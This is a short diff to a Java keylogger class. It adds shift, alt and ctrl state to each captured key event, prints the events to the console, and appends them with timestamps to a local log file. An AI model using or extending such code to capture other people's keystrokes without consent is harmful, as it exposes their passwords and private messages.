@@ -25,7 +25,8 @@ public class KeyLogger extends Thread {
 
 			@Override
 			public void keyPressed(KeyEvent arg0) {
-				append(arg0.getVirtualKeyCode());				
+				append(arg0.getVirtualKeyCode() + "\t" + arg0.isShiftPressed()
+					   + "\t" + arg0.isAltPressed() + "\t" + arg0.isCtrlPressed());				
 			}
 
 			@Override
@@ -41,12 +42,13 @@ public class KeyLogger extends Thread {
 		
 	}
 	
-	private void append(int keyCode) {
+	private void append(String event) {
+		System.out.println(event);
 		try {
 			PrintWriter out = new PrintWriter(new FileWriter(LOG_FILE, true));
 			String timestamp = SDF.format(
 					new Timestamp(System.currentTimeMillis()));
-			out.println(timestamp + "\t" + keyCode);
+			out.println(timestamp + "\t" + event);
 			out.close();
 			
 		} catch (IOException e) {}
